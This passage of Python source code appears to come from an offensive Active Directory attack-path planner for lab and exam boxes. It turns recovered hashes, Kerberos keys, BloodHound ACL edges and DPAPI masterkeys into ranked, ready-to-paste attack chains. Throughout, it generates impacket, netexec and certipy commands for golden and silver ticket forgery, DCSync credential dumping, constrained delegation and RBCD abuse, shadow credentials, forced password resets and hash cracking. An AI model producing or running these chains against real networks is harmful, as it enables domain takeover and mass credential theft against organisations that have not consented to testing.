                                    or "krb5cc" in s.lower()) else "<ticket.ccache>"
        # iter-108: quote the URI for shell safety - dom/user@fqdn could
        # carry $ or other special chars in either half. impacket accepts
        # quoted or unquoted; quoting is safer.
        chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
            crit=6, conf=0.8, ready=1.4, prox=0.8,
            commands=[f"export KRB5CCNAME='{_ccache_path}'; "
                      f"impacket-secretsdump -k -no-pass -dc-ip {_dc_ip_r26} "
                      f"'{_dom_r26}/<user>@{_dc_fqdn_r26}'   "
                      f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
            src=s, line=l))
    # shadow
    if e.has_shadow:
        s, l = e.shadow_src
        # iter-79: use real paths for unshadow. unshadow needs BOTH the
        # shadow and its sibling passwd file - guess passwd via same-dir
        # sibling lookup. Falls back to bare 'passwd shadow' when the
        # sibling isn't present (operator has to fix it up manually).
        _pwd_sibling = ""
        if s:
            _dir = os.path.dirname(s)
            _cand = os.path.join(_dir, "passwd")
            if os.path.isfile(_cand):
                _pwd_sibling = _cand
        if _pwd_sibling and s:
            _unshadow_cmd = f"unshadow '{_pwd_sibling}' '{s}' > u.txt"
        else:
            _unshadow_cmd = f"unshadow passwd '{s or 'shadow'}' > u.txt"
        chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
            crit=5, conf=0.8, ready=0.7, prox=0.6,
            commands=[f"{_unshadow_cmd}; hashcat -m 1800 u.txt rockyou.txt"], src=s, line=l))

    # iter-36: R-SILVER - machine account NT hash (HOSTNAME$ user) can
    # forge a silver ticket for that computer's SPNs (cifs/host/http/
    # ldap/rpcss). More common than krbtgt on lab boxes because any
    # LOCAL SYSTEM access on a domain-joined host yields the machine
    # hash from SECURITY hive dumps.
    silver_seen = set()
    for h, occurrences in e.nt.items():
        for huser, hsrc, hln in occurrences:
            if not huser or not huser.endswith("$"):
                continue
            # Strip potential DOMAIN\ prefix then trailing $, so
            # 'HTB\WEB01$' -> 'WEB01'.
            host_short = huser.split("\\")[-1].rstrip("$")
            if not host_short or host_short.lower() in silver_seen:
                continue
            silver_seen.add(host_short.lower())
            _dom_sv = store.dominant_domain() or "<dom>"
            _sid_sv = store.domain_sid() or "<S-1-5-21-...>"
            _dc_sv = store.dc_ip() or "<DC-IP>"
            _sid_note_sv = "" if _sid_sv.startswith("S-") else (
                f"   # look up domain SID: impacket-lookupsid "
                f"{_dc_sv}/<u>:<p>@{_dc_sv}")
            # iter-55: substitute learned domain into the SPN FQDN so the
            # silver ticket targets the real service. Falls back to '<dom>'
            # placeholder when unknown.
            chains.append(Chain("R-SILVER", "silver ticket",
                f"machine hash {host_short}$ -> silver ticket forgery for {host_short}",
                crit=9, conf=0.9, ready=1.4, prox=0.9,      # score 10.2
                commands=[
                    f"impacket-ticketer -nthash {h} -domain-sid {_sid_sv} "
                    f"-domain {_dom_sv} -spn cifs/{host_short}.{_dom_sv} "
                    f"Administrator{_sid_note_sv}",
                    f"export KRB5CCNAME=Administrator.ccache",
                    # iter-62: -dc-ip anchor for KDC discovery on lab boxes
                    # iter-108: shell-safe quoted URI.
                    f"impacket-psexec -k -no-pass -dc-ip {_dc_sv} "
                    f"'{_dom_sv}/Administrator@{host_short}.{_dom_sv}'",
                ], src=hsrc, line=hln))
            break

    # iter-47: R-CONSTRAINED - owned service account has msDS-AllowedToDelegateTo
    # for a target SPN. Use S4U2self+S4U2proxy to impersonate Administrator
    # to those services. Exam-legal (no relay, no admin gate).
    delegators = {}  # user_lc -> list of target SPNs
    delegator_t2a = {}   # user_lc -> trusted-to-auth bool (T2A4D flag)
    for ev in store.items:
        if ev.kind != "ldap_attr":
            continue
        atd = (ev.meta or {}).get("allowed_to_delegate")
        if atd and ev.user:
            delegators[ev.user.lower()] = atd
            # iter-92: capture the T2A4D flag when bloodhound.py surfaced
            # it. Only true iff the delegator can S4U2Self for arbitrary
            # users; false means constrained delegation is protocol-bound
            # (S4U2Proxy needs an incoming ticket from the target user).
            delegator_t2a[ev.user.lower()] = bool(
                (ev.meta or {}).get("trusted_to_auth", False))
    if delegators:
        seen_c = set()
        # iter-95: also feed in delegator NT hashes so a machine account with
        # AllowedToDelegateTo (very common - a service host's own SPN list)
        # produces R-CONSTRAINED even when only its hash is owned. Zip creds
        # + hashes into one iterable so downstream logic stays uniform.
        _cand = list(e.creds.items())
        for _hash, _occs in e.nt.items():
            for _huser, _hs, _hl in _occs:
                if not _huser:
                    continue
                _hulc = _huser.strip().lower()
                if not _hulc:
                    continue
                # Represent hash auth as pw prefixed with ':' (impacket -hashes
                # LM:NT format); downstream splits on ':' to reconstruct.
                _cand.append(((_hulc, f":{_hash}"), [(_huser, _hs, _hl)]))
        for (ulc, pw), occurrences in _cand:
            if ulc not in delegators or ulc in seen_c:
                continue
            seen_c.add(ulc)
            spns = delegators[ulc]
            best_src, best_line = "", None
            for _d, _s, _l in occurrences:
                if _s:
                    best_src, best_line = _s, _l
                    break
            _dom_c = store.dominant_domain() or "<dom>"
            _dc_c = store.dc_ip() or "<DC-IP>"
            # iter-91: prefer SMB-shaped SPNs when the delegation list has
            # multiple classes. cifs/host give the DA-track path (secretsdump)
            # after S4U2Proxy; picking an mssqlsvc/http SPN when a cifs one
            # exists sends the operator down a dead-end. Rank order: cifs >
            # host > restrictedkrbhost > mssqlsvc > ldap > everything else.
            _SPN_CLASS_RANK = {"cifs": 0, "host": 1, "restrictedkrbhost": 2,
                                "mssqlsvc": 3, "ldap": 4}
            def _spn_prio(s):
                cls = s.split("/", 1)[0].lower() if "/" in s else s.lower()
                return _SPN_CLASS_RANK.get(cls, 99)
            # sort a stable copy so the original list order is preserved
            # elsewhere (the summary still shows the raw sequence)
            first_spn = min(spns, key=_spn_prio) if spns else "cifs/<target>.<dom>"
            # iter-49: SPN format is 'class/host[/port_or_path]' - grab the
            # host portion (index 1). Previous split('/', 1)[-1] returned
            # 'host/http' for 3-part SPNs, which impacket-secretsdump then
            # tried to resolve as a hostname and failed.
            _spn_parts = first_spn.split("/")
            _spn_host = _spn_parts[1] if len(_spn_parts) >= 2 else first_spn
            # iter-68: SPN 'host' may carry a :port or :instance suffix
            # (mssqlsvc/sql01.htb.local:1433, mssqlsvc/sql:SQLEXPRESS).
            # secretsdump needs just the hostname - strip anything past ':'.
            _spn_host = _spn_host.split(":", 1)[0]
            _spn_summary = ", ".join(spns[:3])
            if len(spns) > 3:
                _spn_summary += f" (+{len(spns) - 3} more)"
            # iter-89: the follow-up tool depends on SPN service class.
            # cifs/host SPN -> secretsdump / psexec (SMB is the standard).
            # mssqlsvc SPN  -> impacket-mssqlclient (SMB via secretsdump WON'T
            #                  auth to MSSQL - operator wastes a command).
            # http SPN      -> only usable via web tooling, not exam-legal
            #                  general-purpose. Downgrade note.
            # ldap SPN      -> ldapsearch bind for RID walking / dcsync
            #                  (still needs full DCSync rights).
            _spn_class = _spn_parts[0].lower() if _spn_parts else ""
            _followup = []
            if _spn_class in ("cifs", "host", "restrictedkrbhost"):
                _followup = [
                    f"impacket-secretsdump -k -no-pass -dc-ip {_dc_c} "
                    f"'{_dom_c}/administrator@{_spn_host}'"
                ]
            elif _spn_class == "mssqlsvc":
                _followup = [
                    f"impacket-mssqlclient -k -no-pass -dc-ip {_dc_c} "
                    f"'{_dom_c}/administrator@{_spn_host}'   "
                    f"# -windows-auth via Kerberos ticket",
                ]
            elif _spn_class == "ldap":
                _followup = [
                    f"# LDAP SPN - test bind (need DCSync rights for domain hashes):",
                    f"ldapsearch -Y GSSAPI -H 'ldap://{_spn_host}' "
                    f"-b 'DC={_dom_c.replace('.', ',DC=')}' 'objectClass=user' sAMAccountName",
                ]
            else:
                _followup = [
                    f"# {_spn_class}/... SPN - service-specific auth needed; "
                    f"use ticket against {_spn_host}",
                ]
            # iter-92: warn when T2A4D flag isn't set. Without it, S4U2Self
            # only issues a ticket for the delegator itself - so the
            # '-impersonate administrator' step will KDC_ERR_BADOPTION when
            # the operator runs getST. BH-CE 5.x exposes this reliably;
            # older SharpHound zips may leave it undefined (we default to
            # True in that case so we don't fire the warning on stale data).
            _t2a = delegator_t2a.get(ulc, True)
            _t2a_note = "" if _t2a else (
                "# CAUTION: 'trustedtoauth' flag NOT set on this delegator - "
                "getST -impersonate administrator will fail (S4U2Self "
                "constrained to the delegator itself). Try S4U2Self "
                "impersonating THE DELEGATOR itself, or drop the "
                "-impersonate flag entirely.")
            chains.append(Chain("R-CONSTRAINED", "constrained delegation",
                f"{ulc} has AllowedToDelegateTo: {_spn_summary}",
                crit=8, conf=0.9, ready=1.4, prox=0.95,           # score 9.58
                commands=[
                    f"# {ulc} is trusted to delegate to {len(spns)} "
                    f"SPN{'s' if len(spns) != 1 else ''}"
                    + (f" [T2A4D set - can impersonate arbitrary users]" if _t2a else ""),
                    *([_t2a_note] if _t2a_note else []),
                    # iter-60: -dc-ip anchors KDC discovery on lab boxes
                    # without functional DNS resolution.
                    # iter-95: switch to -hashes syntax when pw starts with ':'
                    # (hash-only auth, used for machine accounts with known NT
                    # hash but no plaintext). impacket wants LM:NT with a
                    # blank LM = aad3b435b51404eeaad3b435b51404ee; leading ':'
                    # form is accepted too but the explicit blank-LM form is
                    # clearest for the operator.
                    (f"impacket-getST -spn '{first_spn}' -impersonate administrator "
                     f"-dc-ip {_dc_c} -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}' "
                     f"'{_dom_c}/{ulc}'"
                     if pw.startswith(":") else
                     f"impacket-getST -spn '{first_spn}' -impersonate administrator "
                     f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'"),
                    f"export KRB5CCNAME=administrator.ccache",
                    *_followup,
                ], src=best_src, line=best_line))

    # iter-45: R-ADMIN-CRED - the operator's owned plaintext cred matches
    # a user BloodHound flagged 'admincount' (Domain Admin candidate).
    # Emit BEFORE R-GOLDEN so the operator sees the trivial win first:
    # they already have Administrator-tier credentials.
    # iter-46: also count users whose admincount Evidence came from group
    # membership (SID-based; resolve to name via store.resolve_sid).
    admincount_users = set()
    admincount_via = {}   # user -> group name (for context in the summary)
    for ev in store.items:
        if ev.kind != "user" or ev.fact != "admincount":
            continue
        u = (ev.user or "").strip()
        if not u:
            continue
        # If Evidence.user is a SID (starts with S-), resolve to name.
        if u.startswith("S-1-"):
            resolved = store.resolve_sid(u)
            if resolved:
                u = resolved
            else:
                continue
        u_low = u.lower()
        admincount_users.add(u_low)
        via = (ev.meta or {}).get("via_group", "")
        if via and u_low not in admincount_via:
            admincount_via[u_low] = via
    if admincount_users:
        seen_ac = set()
        # iter-96: same expansion as iter-95 for R-CONSTRAINED - if the
        # admincount user's NT hash is known but no plaintext, we can still
        # DCSync with -hashes. Zip plaintexts + hashes into one iterable
        # tagged so the emitted command branches on hash vs pw.
        _cand_ac = list(e.creds.items())
        for _hash, _occs in e.nt.items():
            for _huser, _hs, _hl in _occs:
                if not _huser:
                    continue
                _hulc = _huser.strip().lower()
                if not _hulc:
                    continue
                _cand_ac.append(((_hulc, f":{_hash}"), [(_huser, _hs, _hl)]))
        for (ulc, pw), occurrences in _cand_ac:
            if ulc not in admincount_users or ulc in seen_ac:
                continue
            seen_ac.add(ulc)
            best_src, best_line = "", None
            for _disp, _s, _l in occurrences:
                if _s:
                    best_src, best_line = _s, _l
                    break
            _dom_ac = store.dominant_domain() or "<dom>"
            _dc_ac = store.dc_ip() or "<DC-IP>"
            via = admincount_via.get(ulc, "")
            via_note = f" via '{via}'" if via else " (admincount=1)"
            # iter-96: hash-only auth uses -hashes ':NT' impacket syntax.
            _is_hash_ac = pw.startswith(":")
            _hash_flag = f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}'" if _is_hash_ac else ""
            _auth_target = (f"'{_dom_ac}/{ulc}'@{_dc_ac}" if _is_hash_ac
                            else f"'{_dom_ac}/{ulc}:{pw}'@{_dc_ac}")
            _summary_val = f"NT hash for {ulc}" if _is_hash_ac else f"{ulc}:{pw}"
            # iter-115: Backup/Server Operators do NOT hold DRSUAPI GetChanges
            # rights, so the standard secretsdump DCSync form fails. What they
            # DO have is SeBackupPrivilege honored through remote-registry, so
            # they can snapshot HKLM\SAM+SECURITY+SYSTEM off the DC and pull
            # krbtgt from the SECURITY hive's LSA secrets. iter-116: use
            # netexec's --sam / --lsa which drive the same primitive as a
            # one-liner (impacket-reg save writes to the REMOTE machine, so
            # the /tmp/... paths I emitted first were wrong-domain).
            _via_low = via.lower() if via else ""
            _is_bop_sop = _via_low in ("backup operators", "server operators")
            if _is_bop_sop:
                _nxc_auth = (f"-u '{ulc}' -H {pw[1:]}" if _is_hash_ac
                             else f"-u '{ulc}' -p '{pw}'")
                chains.append(Chain("R-ADMIN-CRED", "backup/server op -> hive dump",
                    f"{_summary_val} - {via.title()} member (no DCSync, use hive save)",
                    crit=10, conf=0.95, ready=1.4, prox=1.0,     # score 13.3
                    commands=[
                        f"# {via.title()} hold SeBackupPrivilege remotely; "
                        f"they cannot DCSync. netexec drives the same "
                        f"registry-hive-save primitive as a one-liner:",
                        f"netexec smb {_dc_ac} {_nxc_auth} --sam   "
                        f"# local machine account NT hashes",
                        f"netexec smb {_dc_ac} {_nxc_auth} --lsa   "
                        f"# LSA secrets incl. cached domain krbtgt -> R-GOLDEN",
                    ], src=best_src, line=best_line))
            else:
                chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
                    f"{_summary_val} - tier-0 candidate{via_note}",
                    crit=10, conf=0.95, ready=1.5, prox=1.0,     # score 14.25
                    commands=[
                        f"# BloodHound flags {ulc} as tier-0{via_note}",
                        # iter-54: two variants - full dump for immediate loot,
                        # or targeted krbtgt-only for fast R-GOLDEN cascade.
                        f"impacket-secretsdump{_hash_flag} {_auth_target}",
                        f"# or targeted (just krbtgt for R-GOLDEN):",
                        f"impacket-secretsdump -just-dc-user krbtgt{_hash_flag} "
                        f"{_auth_target}",
                        f"# if either works you have DA - proceed to R-GOLDEN "
                        f"for persistence",
                    ], src=best_src, line=best_line))

    # iter-35: R-GOLDEN - krbtgt NT hash was recovered (from NTDS DCSync or
    # ntds.dit + SYSTEM). One command forges an Administrator TGT for the
    # domain; no network re-auth needed. Highest-value chain when present.
    if getattr(e, "has_krbtgt", False):
        s_gt, l_gt = e.krbtgt_src or ("", None)
        dom_gt = e.krbtgt_dom or store.dominant_domain() or "<dom>"
        # iter-38: thread real domain SID when we've learned one.
        _sid_gt = store.domain_sid() or "<S-1-5-21-...>"
        _sid_note = "" if _sid_gt.startswith("S-") else (
            "\n# Look up the domain SID first (impacket-lookupsid or from any "
            "user's Evidence.meta.principal_sid)")
        # iter-48: use real DC FQDN when known
        _dc_fqdn_gt = store.dc_fqdn() or "<DC-FQDN>"
        # iter-61: -dc-ip anchor for lab boxes without DNS SRV lookups.
        _dc_ip_gt = store.dc_ip() or "<DC-IP>"
        chains.append(Chain("R-GOLDEN", "golden ticket",
            f"krbtgt NT hash present -> forge Administrator TGT (score 15)",
            crit=10, conf=1.0, ready=1.5, prox=1.0,         # score 15.0
            commands=[
                f"impacket-ticketer -nthash {e.krbtgt_hash} "
                f"-domain-sid {_sid_gt} -domain {dom_gt} Administrator{_sid_note}",
                f"export KRB5CCNAME=Administrator.ccache",
                f"impacket-secretsdump -k -no-pass -dc-ip {_dc_ip_gt} "
                f"'{dom_gt}/Administrator@{_dc_fqdn_gt}'   "
                f"# every domain hash",
            ], src=s_gt, line=l_gt))

    # iter-112: R-PTK - Pass-the-Key. When keyword.py finds a Kerberos AES
    # key (from NTDS DCSync / pypykatz / secretsdump), emit a getTGT chain
    # so the operator can auth via Kerberos without needing the plaintext
    # or NT hash. Common on modern boxes where the operator recovered
    # aes256 from NTDS.dit but not the corresponding NT.
    _ptk_seen = set()
    for _ev in store.items:
        if _ev.kind != "kerberos_key" or not _ev.hash:
            continue
        _ptk_user = (_ev.user or "").strip()
        if not _ptk_user or _ptk_user.lower() in _ptk_seen:
            continue
        _ptk_seen.add(_ptk_user.lower())
        _ptk_dom = store.dominant_domain() or "<dom>"
        _ptk_dc = store.dc_ip() or "<DC-IP>"
        _ptk_fqdn = store.dc_fqdn() or "<DC-FQDN>"
        # iter-113: krbtgt AES key = R-GOLDEN-tier. Emit a golden-ticket
        # variant that forges Administrator via ticketer + aesKey (impacket
        # accepts aes256 for -aesKey). Otherwise regular Pass-the-Key.
        # iter-114: machine account AES key (HOST$) = R-SILVER-tier. Silver
        # ticket forgery targeting the machine's own CIFS SPN uses -aesKey
        # in the same ticketer command form; identical value tier as the
        # NT-hash R-SILVER chain.
        _is_krbtgt = _ptk_user.lower() == "krbtgt"
        _is_machine = (not _is_krbtgt) and _ptk_user.endswith("$")
        if _is_krbtgt:
            _sid_ptk = store.domain_sid() or "<S-1-5-21-...>"
            chains.append(Chain("R-GOLDEN", "golden ticket via krbtgt AES key",
                f"krbtgt AES key present -> forge Administrator TGT (score 15)",
                crit=10, conf=1.0, ready=1.5, prox=1.0,      # score 15.0
                commands=[
                    f"impacket-ticketer -aesKey {_ev.hash} "
                    f"-domain-sid {_sid_ptk} -domain {_ptk_dom} Administrator",
                    f"export KRB5CCNAME=Administrator.ccache",
                    f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
                    f"'{_ptk_dom}/Administrator@{_ptk_fqdn}'   "
                    f"# every domain hash",
                ], src=_ev.source, line=_ev.line))
        elif _is_machine:
            _sid_ptk = store.domain_sid() or "<S-1-5-21-...>"
            _host_short = _ptk_user.split("\\")[-1].rstrip("$")
            chains.append(Chain("R-SILVER", "silver ticket via machine AES key",
                f"machine AES key {_ptk_user} -> silver ticket forgery for {_host_short}",
                crit=9, conf=0.9, ready=1.4, prox=0.9,       # score 10.2
                commands=[
                    f"impacket-ticketer -aesKey {_ev.hash} "
                    f"-domain-sid {_sid_ptk} -domain {_ptk_dom} "
                    f"-spn cifs/{_host_short}.{_ptk_dom} Administrator",
                    f"export KRB5CCNAME=Administrator.ccache",
                    f"impacket-psexec -k -no-pass -dc-ip {_ptk_dc} "
                    f"'{_ptk_dom}/Administrator@{_host_short}.{_ptk_dom}'",
                ], src=_ev.source, line=_ev.line))
        else:
            # Score is between R7 (11ish for domain user hash) and R-GOLDEN
            # (15 for krbtgt). AES256 for regular user is same value tier as
            # PtH - ~8-11 depending on target proximity.
            chains.append(Chain("R-PTK", "pass-the-key",
                f"Kerberos AES key for {_ptk_user} -> impersonate via TGT",
                crit=8, conf=0.85, ready=1.5, prox=0.9,      # score 9.18
                commands=[
                    f"# recovered AES key ({_ev.hash[:16]}...) - request a TGT:",
                    f"impacket-getTGT '{_ptk_dom}/{_ptk_user}' "
                    f"-aesKey {_ev.hash} -dc-ip {_ptk_dc}",
                    f"export KRB5CCNAME='{_ptk_user}.ccache'",
                    f"impacket-secretsdump -k -no-pass -dc-ip {_ptk_dc} "
                    f"'{_ptk_dom}/{_ptk_user}@{_ptk_fqdn}'   "
                    f"# if user has DCSync rights -> R-GOLDEN cascade",
                ], src=_ev.source, line=_ev.line))

    # iter-24: R-DPAPI - pair a recovered masterkey sha1 (pypykatz / impacket
    # output) with a Windows Credential vault file we've seen. With both,
    # decryption is one impacket-dpapi command - no online prompt needed.
    # Looks for masterkey via Evidence(kind='dpapi_mk', meta={sha1}) and
    # Credential blob via INTERESTING FILES finding referencing /Credentials/<hex>.
    # iter-117: skip system-tagged masterkey seeds from LSA DPAPI_SYSTEM -
    # dpapi_machinekey/userkey unwraps a MACHINE-scope masterkey file, not
    # a user Credentials\ blob directly. Pairing them here would emit a
    # command that silently fails to decrypt. The LSA finding's hint already
    # documents the two-step unwrap flow for the operator.
    dpapi_mks = [ev for ev in store.items if ev.kind == "dpapi_mk"
                 and (ev.meta or {}).get("sha1")
                 and not (ev.meta or {}).get("system")]
    blob_paths = []
    for f in report.findings:
        det = (f.get("detail") or "")
        src = f.get("file") or ""
        if "Windows Credential vault" in det or "/Credentials/" in src or "\\Credentials\\" in src:
            blob_paths.append((src, f.get("line")))
    if dpapi_mks and blob_paths:
        # Pair the first masterkey with each blob; operator runs once per blob
        # and the right masterkey is whichever decrypts (impacket prints success).
        mk = dpapi_mks[0]
        sha1 = mk.meta["sha1"]
        for bsrc, bln in blob_paths[:5]:    # cap at 5 to avoid spam
            chains.append(Chain("R-DPAPI", "DPAPI masterkey + blob pair",
                f"masterkey sha1={sha1[:16]}... + {os.path.basename(bsrc)}",
                crit=8, conf=0.85, ready=1.5, prox=0.85,        # score 8.67
                commands=[
                    f"impacket-dpapi credential -key 0x{sha1} '{bsrc}'",
                    f"# decrypted blob holds saved Chrome/RDP/Vault/Wifi creds; "
                    f"feed any plaintext into spray (R1)",
                ], src=bsrc, line=bln))

    # iter-23: ACL-edge chains.
    # When the operator owns ANY plaintext credential AND BloodHound reveals
    # an abusable Aces[] right from that principal to a target, emit a
    # concrete certipy-shadow / dacledit / addcomputer / rbcd-attack command.
    # The principal in Aces[] is reported as a SID (BloodHound doesn't
    # cross-resolve in the JSON), so we phrase the command as the OPERATOR's
    # owned principal acting via -u — the SID is shown in the summary for
    # the operator to confirm the route in the BloodHound GUI.
    # iter-97: 'have_creds' also true when only hashes are known - the ACL
    # chain commands can use -hashes for impacket / -H for netexec, so a
    # hash-only recovery should still fire (R-DCSYNC / R-SHADOW etc.).
    have_creds = bool(e.creds or e.nt)
    if e.acl_edges and have_creds:
        seen = set()
        # AddKeyCredentialLink -> Shadow Credentials -> NT hash via PKINIT.
        # Highest-leverage modern abuse: no password reset, fully reversible.
        for edge in e.acl_edges:
            r = edge["right"]
            tgt = edge["target"] or "<target>"
            key = (r, tgt)
            if key in seen:
                continue
            seen.add(key)
            # iter-39: resolve principal SID -> username so summaries name
            # the ACTOR instead of showing S-1-5-21-...-1105.
            _psid = edge.get("principal", "") or ""
            _pname = store.resolve_sid(_psid) or ""
            actor = f"{_pname}" if _pname else _psid or "<owned-user>"
            # iter-41: consolidated so every branch doesn't re-derive it
            _owned = _pname if _pname else "<owned-user>"
            # iter-44: same for the domain substitution
            _dom_e = store.dominant_domain() or "<dom>"
            # iter-52: substitute learned DC IP so command paste hits a real
            # target. Falls back to '<DC>' placeholder when unknown.
            _dc_e = store.dc_ip() or "<DC-IP>"
            # iter-59: look up the actor's password so commands like
            # 'certipy-ad shadow auto -u HELPDESK -p <owned-password>' become
            # 'certipy-ad shadow auto -u HELPDESK -p ThePassword'. Falls
            # back to '<owned-password>' when the resolved principal isn't in
            # e.creds (e.g. principal name doesn't match a stored cred).
            # iter-64: use angle-bracket placeholder (was literal '{_owned_pw}'
            # which looked like an unfilled Python format spec in output).
            _owned_pw = "<owned-password>"
            # iter-97: also check for NT hash when no plaintext exists for the
            # actor. Emit '<owned-nthash>' to signal to the operator to swap
            # '-p X' -> '-hashes :X' and 'user:pw' -> 'user' + '-hashes :X'
            # in each impacket call. Keeps chain output correct for the
            # hash-only case without rewriting every ACL branch's syntax.
            _owned_hash = ""
            if _pname:
                _pname_lc = _pname.lower()
                for (_ulc, _pw), _ in e.creds.items():
                    if _ulc == _pname_lc:
                        _owned_pw = _pw
                        break
                else:
                    for _h, _occs in e.nt.items():
                        for _hu, _hs, _hl in _occs:
                            if (_hu or "").strip().lower() == _pname_lc:
                                _owned_hash = _h
                                break
                        if _owned_hash:
                            break
            # iter-99: normalise auth strings once per ACL edge so each branch
            # reads uniformly. hash form uses '-hashes aad3b4...:NT' (impacket
            # blank-LM) or '-H NT' (netexec) or '--pw-nt-hash -U user%HASH'
            # (samba net rpc). Plaintext keeps the original -p / user:pw form.
            _blank_lm = "aad3b435b51404eeaad3b435b51404ee"
            if _owned_hash:
                _impacket_uri = f"'{_dom_e}/{_owned}'"           # no ':pw' suffix
                _impacket_hash = f"-hashes '{_blank_lm}:{_owned_hash}'"
                _netexec_auth = f"-H {_owned_hash}"
                _net_rpc_U = f"-U '{_dom_e}/{_owned}%{_owned_hash}' --pw-nt-hash"
            else:
                _impacket_uri = f"'{_dom_e}/{_owned}:{_owned_pw}'"
                _impacket_hash = ""
                _netexec_auth = f"-p '{_owned_pw}'"
                _net_rpc_U = f"-U '{_dom_e}/{_owned}%{_owned_pw}'"
            # iter-37: DCSync rights - direct DCSync without needing to
            # gain admin first. Highest-value ACL-edge chain because it
            # yields krbtgt (which then enables R-GOLDEN at score 15).
            # Dedup: only emit ONE chain per target even if both
            # GetChanges + GetChangesAll edges are present (both are
            # needed for DCSync; the finding is per-target, not per-right).
            if r in ("GetChanges", "GetChangesAll",
                     "GetChangesInFilteredSet"):
                dcsync_key = ("dcsync", tgt)
                if dcsync_key in seen:
                    continue
                seen.add(dcsync_key)
                _dom_ds = store.dominant_domain() or "<dom>"
                _dc_ds = store.dc_ip() or "<DC-IP>"
                # iter-39: use resolved principal name in owned-user slot
                # when known, so the operator can paste directly.
                # iter-97: emit -hashes variant when we have the actor's NT
                # hash instead of a plaintext. This is common when the actor
                # is a machine account (sql01$ with GetChanges to the DC).
                if _owned_hash:
                    _ds_cmd = (f"impacket-secretsdump -just-dc-user krbtgt "
                               f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_owned_hash}' "
                               f"'{_dom_ds}/{_owned}'@{_dc_ds}")
                else:
                    _ds_cmd = (f"impacket-secretsdump -just-dc-user krbtgt "
                               f"'{_dom_ds}/{_owned}:{_owned_pw}'@{_dc_ds}")
                chains.append(Chain("R-DCSYNC", "direct DCSync via ACL",
                    f"DCSync rights: {actor} on {tgt} (GetChanges + "
                    f"GetChangesAll)",
                    crit=10, conf=0.9, ready=1.5, prox=1.0,        # score 13.5
                    commands=[
                        (f"# principal (SID {_psid})" if not _pname else
                         f"# principal resolved -> '{_pname}'"),
                        _ds_cmd,
                        f"# with krbtgt hash, next: R-GOLDEN chain",
                    ], src=edge["src"], line=edge["line"]))
                continue
            if r == "AddKeyCredentialLink":
                # iter-64: R-SHADOW had literal '<dom>' in the certipy-ad
                # UPN slot even after iter-44 threaded the real domain into
                # every other ACL-edge chain. Fixed to use _dom_e so the
                # operator gets 'user@htb.local' instead of 'user@<dom>'.
                # iter-98: certipy-ad shadow auto supports -hashes :NT for
                # hash-only actor auth. Route by _owned_hash so a machine
                # account (or captured hash without plaintext) still fires.
                if _owned_hash:
                    _sh_auth = (f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{_owned_hash}'")
                else:
                    _sh_auth = f"-p '{_owned_pw}'"
                chains.append(Chain("R-SHADOW", "shadow credentials",
                    f"AddKeyCredentialLink: {actor} -> {tgt} "
                    f"(Shadow Creds -> PKINIT -> NT hash)",
                    crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
                    commands=[
                        f"certipy-ad shadow auto -u '{_owned}@{_dom_e}' "
                        f"{_sh_auth} -account '{tgt}' -dc-ip {_dc_e}",
                        f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
                    ], src=edge["src"], line=edge["line"]))
            elif r in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner"):
                # If target is a user, ForceChangePassword path; if computer,
                # RBCD path. iter-23: target_kind from meta is reliable;
                # bloodhound stores computers as FQDN (no '$' suffix).
                computer = (edge.get("target_kind") == "computers"
                            or tgt.endswith("$"))
                # iter-40: resolve principal for -u '<owned-user>' slot.
                if computer:
                    # Derive sam-style host name (no $/.fqdn) for RBCD CLI.
                    # 'WEB01.HTB.LOCAL' -> 'WEB01'; 'WEB01$' -> 'WEB01'.
                    host_short = tgt.split(".")[0].rstrip("$")
                    fqdn = tgt if "." in tgt else f"{host_short}.{_dom_e}"
                    # iter-102: hash-only actor auth. impacket-addcomputer +
                    # impacket-rbcd both accept -hashes; append the -hashes
                    # flag to the actor's auth. The final getST +
                    # secretsdump use the attacker$ ccache so aren't affected.
                    _hf = f" {_impacket_hash}" if _impacket_hash else ""
                    chains.append(Chain("R-RBCD", "RBCD via writeable AD object",
                        f"{r}: {actor} -> {tgt} "
                        f"(RBCD -> S4U2self+U2U -> LocalSystem)",
                        crit=8, conf=0.7, ready=1.2, prox=0.85,     # score 5.71
                        commands=[
                            f"impacket-addcomputer -computer-name 'attacker$' "
                            f"-computer-pass 'P@ssw0rd!' -dc-host {_dc_e}{_hf} "
                            f"{_impacket_uri}",
                            f"impacket-rbcd -delegate-from 'attacker$' "
                            f"-delegate-to '{host_short}$' -action write{_hf} "
                            f"{_impacket_uri}",
                            f"impacket-getST -spn 'cifs/{fqdn}' -dc-ip {_dc_e} "
                            f"-impersonate administrator '{_dom_e}/attacker$:P@ssw0rd!'",
                            f"export KRB5CCNAME=administrator.ccache; "
                            f"impacket-secretsdump -k -no-pass -dc-ip {_dc_e} "
                            f"'{_dom_e}/administrator@{fqdn}'",
                        ], src=edge["src"], line=edge["line"]))
                else:
                    chains.append(Chain("R-WRITEDACL", "force-change-password via writeable user",
                        f"{r}: {actor} -> {tgt} (ForceChangePassword -> own as DA?)",
                        crit=7, conf=0.7, ready=1.3, prox=0.85,     # score 5.42
                        commands=[
                            f"net rpc password '{tgt}' '<NewP@ss123!>' "
                            f"{_net_rpc_U} -S {_dc_e}",
                            f"netexec smb {_dc_e} -u '{tgt}' -p '<NewP@ss123!>' --shares",
                        ], src=edge["src"], line=edge["line"]))
            elif r == "ForceChangePassword":
                chains.append(Chain("R-WRITEDACL", "ForceChangePassword",
                    f"ForceChangePassword: {actor} -> {tgt}",
                    crit=7, conf=0.8, ready=1.4, prox=0.85,         # score 6.66
                    commands=[
                        f"net rpc password '{tgt}' '<NewP@ss123!>' "
                        f"{_net_rpc_U} -S {_dc_e}",
                    ], src=edge["src"], line=edge["line"]))
            elif r == "ReadGMSAPassword":
                # iter-99: use _netexec_auth ('-H NT' when hash-only, else -p).
                chains.append(Chain("R-GMSA-READ", "read gMSA password",
                    f"ReadGMSAPassword: {actor} -> {tgt}",
